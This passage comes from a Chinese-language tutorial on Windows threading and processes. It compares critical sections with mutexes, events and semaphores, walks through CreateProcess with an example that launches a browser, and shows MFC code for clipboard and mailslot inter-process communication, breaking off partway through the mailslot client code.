关键代码段工作在用户方式下，同步速度较快；但在使用关键代码段时，很容易进入死锁状态，因为在等待进入关键代码段时无法设定超时值。</p><blockquote><p>用户级别的同步：即关键代码段，只能本进程中进行同步。</p><p>内核级别的同步：互斥量/事件/信号量，可以跨进程同步。</p></blockquote><p>通常，在编写多线程程序并需要实现线程同步时，首选关键代码段，由于它的使用比较简单，如果是在MFC程序中使用的话：</p><ul><li>可以在类的构造函数Init中调用<code>InitializeCriticalSection</code>函数；</li><li>在该类的析构函数中调用<code>DeleteCriticalSection</code>函数</li><li>在所需保护的代码前面调用<code>EnterCriticalSection</code>函数</li><li>在访问完所需保护的资源后，调用<code>LeaveCriticalSection</code>函数。</li></ul><p>可见，关键代码段在使用上是非常方便的，但有几点需要注意：</p><ul><li><p>在程序中调用了<code>EnterCriticalSection</code>后，要相应的调用<code>LeaveCriticalSection</code>函数，否则其他等待该临界区对象所有权的线程将无法执行。</p></li><li><p>如果访问关键代码段时，使用了多个临界区对象，就要注意防止线程死锁的发生。</p></li><li><p>另外，如果需要在多个进程间的各个线程间实现同步的话，可以使用互斥对象和事件对象或者信号量。</p></li></ul><table><thead><tr><th>比较</th><th>互斥量 Mutex</th><th>事件对象 Event</th><th>信号量对象 Semaphore</th><th>关键代码段 Criticalsection</th></tr></thead><tbody><tr><td>是否为内核对象</td><td>是</td><td>是</td><td>是</td><td>否</td></tr><tr><td>速度</td><td>较慢</td><td>较慢</td><td>慢</td><td>快</td></tr><tr><td>多个进程中的线程同步</td><td>支持</td><td>支持</td><td>支持</td><td>不支持</td></tr><tr><td>发生死锁</td><td>否</td><td>否</td><td>否</td><td>是</td></tr><tr><td>组成</td><td>一个线程ID；用来标识哪个线程拥有该互斥量；一个计数器：用来指明该线程用于互斥对象的次数</td><td>一个使用计数；一个布尔值：用来标识该事件是自动重置还是人工重置；一个布尔值：标识该事件处于有信号状态还是无信号状态</td><td>一个使用计数； 最大资源数； 标识当前可用的资源数</td><td>一个小代码段； 在代码能够执行前，必须占用对某些资源的访问权</td></tr><tr><td>相关函数</td><td>CreateMutex WaitForSingleObjects //被保护的内容 ReleaseMutex</td><td>CreateEvent ResetEvent WaitforSingleobject //保护内容 SetEvent</td><td>CreateSemaphore WaitForsingleobject //被保护的内容 ReleaseSemaPhore</td><td>InitialCriticalSection EnterCritionSection //被保护的内容 LeaveCritialSection DeleteCritialSection</td></tr><tr><td>注意事项</td><td>谁拥有互斥对象，谁释放； 如果多次在同一个线程中请求同一个互斥对象，需要多次调用releaseMutex</td><td>为了实现线程间的同步，不应该使用人工重置，应该把第二个参数设置false；设置为自动重置</td><td>它允许多个线程在同一时间访问同一个资源；但是需要限制访问此资源的最大线程数目；</td><td>防止死锁：使用多个关键代码段变量的时候</td></tr><tr><td>类比</td><td>一把钥匙</td><td>钥匙（自动/人工）</td><td>停车场和保安</td><td>电话亭</td></tr></tbody></table><p>🔺什么是线程安全？</p><p>假如你的代码在多线程执行和单线程执行永远是完全一样的结果，那么你的代码是线程安全的。</p><blockquote><p>陈硕《muduo》</p></blockquote><br><h2 id="八-进程"><a href="#八-进程" class="headerlink" title="八 进程"></a>八 进程</h2><h3 id="8-1-基本概念：进程和子进程"><a href="#8-1-基本概念：进程和子进程" class="headerlink" title="8.1 基本概念：进程和子进程"></a>8.1 基本概念：进程和子进程</h3><p>📋程序、进程：正在运行的程序</p><ul><li>程序：是计算机指令的集合，它以文件的形式存储在磁盘上；</li><li>进程：通常被定义为一个正在运行的程序的实例，是一个程序在其自身的地址空间中的一次执行活动。<ul><li>一个程序可以对应多个进程；</li><li>进程是资源申请、调度和独立运行的单位。因此，它使用系统中的运行资源；</li><li>而程序不能申请系统资源，不能被系统调度也不能作为独立运行的单位，因此它不占系统运行资源。</li></ul></li></ul><blockquote><p>一般Windows程序员不适用任务管理器，而是使用 <code>procexp64.exe</code> 【<code>Process Explorer</code>】替代，可以显示更多任务信息。</p></blockquote><p>📋进程组成：</p><ol><li>操作系统用来管理进程的内核对象<ul><li>内核对象是操作系统用来存放关于进程的统计信息的地方；</li><li>内核对象是在操作系统内部，分配的一个内存块，该内存块是一种数据结构，其成员负责维护该对象的各种信息。</li></ul></li><li>地址空间：它包含所有可执行模块或DLL模块的代码和数据。另外，它也包含动态内存分配的空间，例如线程的栈和堆分配空间。</li></ol><p>📋需要注意的另一点：<span style="background:#5de420">进程从来不执行任何东西，它只是纯粹的容器。</span>若要完成某项操作，它必须拥有一个在它的环境中运行的线程，此线程负责执行包含在进程的地址空间的中的代码。也就是说，真正完成代码执行的是线程，而进程只是纯粹的容器，或者说是线程的执行环境。</p><ul><li>子进程，还是一个进程；子进程指的是由另一进程【对应的父进程】所创建的进程；</li><li>单任务的同步机制：线程，子进程，需要保护地址空间；</li><li>子进程的线程既可以在父进程终止之后执行我们的代码；也可以在父进程运行的过程中执行代码。</li></ul><br><h3 id="8-2-如何创建一个进程"><a href="#8-2-如何创建一个进程" class="headerlink" title="8.2 如何创建一个进程"></a>8.2 如何创建一个进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CreateProcess函数:创建成功返回TRUE</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateProcessW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpApplicationName,<span class="comment">//该字符串可以指定要执行的模块的完整路径和文件名</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ LPWSTR lpCommandLine,  <span class="comment">//命令行</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//有Attributes必然是内核对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//该结构确定子进程是否可以继承返回到新进程对象的句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//如果lpProcessAttributes为【默认】NULL，则不能继承该句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//该结构确定子进程是否可以继承返回到新线程对象的句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//如果lpThreadAttributes为NULL，则不能继承该句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//如果此参数为TRUE，则新进程将继承调用进程中的每个可继承句柄;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//如果参数为FALSE，则不会继承句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//请注意，继承的句柄与原始句柄具有相同的值和访问权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">// 控制优先级类别和流程创建的标志 CREATE_NEW_CONSOLE</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">// 指向新进程的环境块的指针。如果此参数为【默认】NULL，则新进程将使用调用进程的环境</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpCurrentDirectory,<span class="comment">// 进程当前目录的完整路径</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPSTARTUPINFOW lpStartupInfo, <span class="comment">//设置扩展属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ LPPROCESS_INFORMATION lpProcessInformation <span class="comment">//该结构接收有关新进程的标识信息</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><blockquote><p>在线查windows文档：微软的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/">帮助文档网址</a></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//拉起谷歌浏览器</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RunExe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//TCHAR szCommandLine[] = L&quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot;;//注意w_char的写法</span></span><br><span class="line">    <span class="comment">//w_char带参数</span></span><br><span class="line">    TCHAR szCommandLine[] = <span class="string">L&quot;\&quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\&quot; http://www.baidu.com/&quot;</span>;</span><br><span class="line">    <span class="comment">//TCHAR szCommandLine[] = _T(&quot;\&quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\&quot; http://www.baidu.com/&quot;);</span></span><br><span class="line">    <span class="comment">//TCHAR szCommandLine[] = L&quot;cmd.exe&quot;;</span></span><br><span class="line"></span><br><span class="line">    STARTUPINFOW strStartupInfo;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;strStartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(STARTUPINFOW));</span><br><span class="line">    strStartupInfo.cb = <span class="built_in">sizeof</span>(strStartupInfo);<span class="comment">//默认写法</span></span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION szProcessInformation;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;szProcessInformation, <span class="number">0</span>, <span class="built_in">sizeof</span>(szProcessInformation));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bRet = <span class="built_in">CreateProcess</span>(</span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//该字符串可以指定要执行的模块的完整路径和文件名</span></span><br><span class="line">        szCommandLine,<span class="comment">//命令行</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//子进程不可以继承返回到【新进程对象】的句柄</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//子进程不可以继承返回的【新线程对象】的句柄</span></span><br><span class="line">        FALSE,<span class="comment">//新进程不继承调用进程中的每个可继承句柄</span></span><br><span class="line">        CREATE_NEW_CONSOLE,<span class="comment">//选项：创建新的控制台应用</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//新进程将使用调用进程的环境</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// 进程当前目录的完整路径</span></span><br><span class="line">        &amp;strStartupInfo,<span class="comment">//设置扩展属性</span></span><br><span class="line">        &amp;szProcessInformation<span class="comment">//接收有关新进程的标识信息</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Create Success bRet\n&quot;</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(szProcessInformation.hProcess, <span class="number">3000</span>);<span class="comment">//等待是否创建成功</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hProcess=%d\n&quot;</span>, szProcessInformation.hProcess);<span class="comment">//228</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hThread=%d\n&quot;</span>, szProcessInformation.hThread);<span class="comment">//224</span></span><br><span class="line">        <span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line">        szProcessInformation.dwProcessId = <span class="number">0</span>;</span><br><span class="line">        szProcessInformation.dwThreadId = <span class="number">0</span>;</span><br><span class="line">        szProcessInformation.hThread = <span class="literal">NULL</span>;</span><br><span class="line">        szProcessInformation.hProcess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf_s</span>(<span class="string">&quot;Create Failed bRet = %d\n&quot;</span>, bRet);</span><br><span class="line">        <span class="built_in">printf_s</span>(<span class="string">&quot;errorcode = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is Chrome!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">RunExe</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="8-3-进程间通信方式"><a href="#8-3-进程间通信方式" class="headerlink" title="8.3 进程间通信方式"></a>8.3 进程间通信方式</h3><ol><li><code>socket</code>编程【IP和端口 | <code>server</code> <code>client</code>】</li><li>剪切板【剪切板的内核对象】</li><li>邮槽【邮槽的内核对象，较原始，目前用的少】</li><li>匿名管道【无名管道】</li><li>命名管道</li><li>Copy_data findwindows wm_copydata 很多书籍都没有 消息</li></ol><p>Sendmessage</p><br><h3 id="8-4-进程间通信方式之剪切板"><a href="#8-4-进程间通信方式之剪切板" class="headerlink" title="8.4 进程间通信方式之剪切板"></a>8.4 进程间通信方式之剪切板</h3><blockquote><p>第一次接触MFC，简单记录入门用法</p></blockquote><ol><li>首先获取MFC开发包【工具 | 获取工具和功能 | 单个组件：搜索MFC，选择最新<code>v143</code>生成工具的<code>C++ MFC</code>，勾选下载时安装，点击修改】，然后创建MFC应用，选择基于对话框的应用。</li><li>设置该项目为启动项，编译运行出现对话框。</li><li>点击资源文件中的<code>rc</code>文件，出现资源视图，选择【<code>MFCApplication_clip.rc</code> | <code>Dialog</code> | <code>IDD_MFCAPPLICATION_CLIP_DIALOG</code>】，即可使用工具箱编辑对话框。</li></ol><p>其中，用到的技巧有以下：</p><ul><li>选中后按<code>Delete</code>键，删除所选控件；</li><li>选中后按<code>Ctrl</code>键，复制所选控件；</li><li>选中控件，右键属性可编辑<ul><li>修改<code>Caption</code>【描述文字】字段为【发送 | 接受】</li><li>修改四个控件的ID字段</li></ul></li><li>双击控件，自动实现事件代码</li></ul><p><img src="./8-1.png"></p><br><p>在以下代码中，系统维护管理的一块内存区域，用于发送和接受。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在MFCApplication_clipDlg.cpp中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplicationclipDlg::OnBnClickedButtonSend</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="comment">//1 打开剪切板</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())<span class="comment">//返回打开结果</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//2 清空剪切板</span></span><br><span class="line">        <span class="built_in">EmptyClipboard</span>();</span><br><span class="line">        <span class="type">char</span>* szSendBuf;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 获取编辑框的内容【下面三行是在UNICODE字符集下】</span></span><br><span class="line">        <span class="comment">//CStringW strSendW;//CString</span></span><br><span class="line">        <span class="comment">//GetDlgItemText(IDC_BUTTON_SEND, strSendW); //此函数只支持UNICODE</span></span><br><span class="line">        <span class="comment">//CStringA strSend = (CStringA)strSendW;</span></span><br><span class="line">        CStringA strSend;</span><br><span class="line">        <span class="built_in">GetDlgItemText</span>(IDC_EDIT_SEND, strSend);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4 分配内存对象,内存对象的句柄就是hClip</span></span><br><span class="line">        HANDLE hClip = <span class="built_in">GlobalAlloc</span>(GMEM_MOVEABLE, strSend.<span class="built_in">GetLength</span>() + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5 将剪切板加锁</span></span><br><span class="line">        szSendBuf = (<span class="type">char</span>*)<span class="built_in">GlobalLock</span>(hClip);</span><br><span class="line">        <span class="built_in">strcpy</span>(szSendBuf, strSend);</span><br><span class="line">        <span class="built_in">GlobalUnlock</span>(hClip);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6 将数据放入剪切板</span></span><br><span class="line">        <span class="built_in">SetClipboardData</span>(CF_TEXT, hClip);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//7 关闭剪切板</span></span><br><span class="line">        <span class="built_in">CloseClipboard</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplicationclipDlg::OnBnClickedButtonRecv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="comment">//1 打开剪切板</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())<span class="comment">//返回打开结果</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//2 判断剪切板是否可用</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsClipboardFormatAvailable</span>(CF_TEXT))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span>* szRecvBuf;</span><br><span class="line">            <span class="comment">//3 取得剪切板内存对象HANDLE</span></span><br><span class="line">            HANDLE hclip = <span class="built_in">GetClipboardData</span>(CF_TEXT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//4 加锁读取【锁定全局内存对象并返回指向对象内存块的第一个字节的指针】</span></span><br><span class="line">            szRecvBuf = (<span class="type">char</span>*)<span class="built_in">GlobalLock</span>(hclip);</span><br><span class="line">            <span class="comment">//USES_CONVERSION;</span></span><br><span class="line">            <span class="comment">//用于字符集转换的宏【此处开始修改字符集为多字节字符集】</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//6 将数据放入编辑框</span></span><br><span class="line">            <span class="built_in">SetDlgItemTextA</span>(IDC_EDIT_RECV, szRecvBuf);</span><br><span class="line">            <span class="comment">//7 解锁</span></span><br><span class="line">            <span class="built_in">GlobalUnlock</span>(hclip);</span><br><span class="line">            <span class="comment">//8 关闭剪切板</span></span><br><span class="line">            <span class="built_in">CloseClipboard</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="8-5-进程间通信方式之邮槽"><a href="#8-5-进程间通信方式之邮槽" class="headerlink" title="8.5 进程间通信方式之邮槽"></a>8.5 进程间通信方式之邮槽</h3><p>邮槽是早期的进程通信方式，目前已经很少用。【邮槽的内核对象】</p><ul><li>使用邮槽通信的进程分为服务端和客户端。</li><li>邮槽由服务端创建，在创建时需要指定邮槽名，创建后服务端得到邮槽的句柄。</li><li>在邮槽创建后，客户端可以通过邮槽名打开邮槽，在获得句柄后可以向邮槽写入消息。</li></ul><p>需要注意的是：</p><ul><li><p>邮槽通信是单向的，只有服务端才能从邮槽中读取消息，客户端只能写入消息。消息是先入先出的【客户端先写入的消息，在服务端先被读取】。</p></li><li><p>通过邮槽通信的数据可以是任意格式的，但是一条消息不能大于<code>424</code>字节。</p></li><li><p>邮槽除了在本机内进行进程间通信外，在主机间也可以通信。但是在主机间进行邮槽通信，数据通过网络传播时使用的是数据报协议【UDP】，所以是一种不可靠的通信。通过网络进行邮槽通信时，客户端必须知道服务端的主机名或域名。</p><br></li></ul><p><strong>示例：</strong>首先创建一个MFC服务端，然后在同一个解决方案中创建新的MFC项目客户端，并实现邮槽通信</p><blockquote><p>点击服务端接收，创建邮槽并无限等待；再点击客户端发送，服务端接到消息，触发<code>MessageBox</code>。</p></blockquote><p><img src="./8-2.png"></p><p>📋服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedRecv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="comment">//    &quot;\\\\.\\mailslot\\Mymailslot    \\.\mailslot\Mymailslot </span></span><br><span class="line">    <span class="comment">//  1  创建一个邮槽</span></span><br><span class="line">    LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">    HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line">        szSlotName,</span><br><span class="line">        <span class="number">0</span>,                             <span class="comment">// no maximum message size </span></span><br><span class="line">        MAILSLOT_WAIT_FOREVER,         <span class="comment">// no time-out for operations </span></span><br><span class="line">        <span class="literal">NULL</span>); <span class="comment">// default security</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (hSlot == INVALID_HANDLE_VALUE)<span class="comment">//创建不成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//注意MFC的报错日志写法！</span></span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;CreateMailslot failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 读数据</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwRead;<span class="comment">//实际读到的长度</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hSlot, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//此处修改两个项目【server|client】为多字节项目，否则不支持直接的字符串</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;Read Failed!&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hSlot);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 显示数据</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;############## dwRead = %d ########\n&quot;</span>, dwRead);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSlot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>📋客户端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotclientDlg::OnBnClickedSend</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="comment">// 创建一个文件句柄</span></span><br><span class="line">    LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">    HANDLE hMailSlot =</span><br><span class="line">        <span class="built_in">CreateFile</span>(szSlotName, FILE_GENERIC_WRITE,</span><br><span class="line">            FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hMailSlot == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;CreateFile failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入数据</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="string">&quot;Mail Slot coming&quot;</span>&#125;;</span><br><span class="line">    DWORD dwWrite;</span><br><span class="line">    <span class="keyword">if</span> (!<span 